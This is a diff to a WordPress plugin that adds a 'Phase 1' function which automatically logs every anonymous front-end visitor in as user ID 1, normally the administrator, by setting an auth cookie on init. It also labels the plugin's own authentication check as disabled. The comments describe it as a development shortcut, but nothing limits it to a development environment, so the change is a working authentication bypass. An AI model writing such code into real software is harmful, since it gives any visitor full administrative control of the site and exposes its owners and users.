@@ -10,7 +10,35 @@ if (!defined('ABSPATH')) {
 }
 
 /**
+ * PHASE 1: Auto-login bypass for development
+ * Automatically logs in an admin user to bypass authentication
+ */
+function cdc_phase1_auto_login() {
+    // Skip for AJAX, REST, and admin
+    if (defined('DOING_AJAX') && DOING_AJAX) return;
+    if (defined('REST_REQUEST') && REST_REQUEST) return;
+    if (is_admin()) return;
+
+    // If already logged in, nothing to do
+    if (is_user_logged_in()) {
+        return;
+    }
+
+    // Auto-login as admin (ID 1) for Phase 1 testing
+    $user_id = 1;
+    $user = get_user_by('id', $user_id);
+
+    if ($user) {
+        wp_set_current_user($user_id);
+        wp_set_auth_cookie($user_id);
+        do_action('wp_login', $user->user_login, $user);
+    }
+}
+add_action('init', 'cdc_phase1_auto_login');
+
+/**
  * Check authentication and redirect if necessary
+ * DISABLED FOR PHASE 1
  */
 function cdc_check_authentication() {
     // Skip for AJAX requests
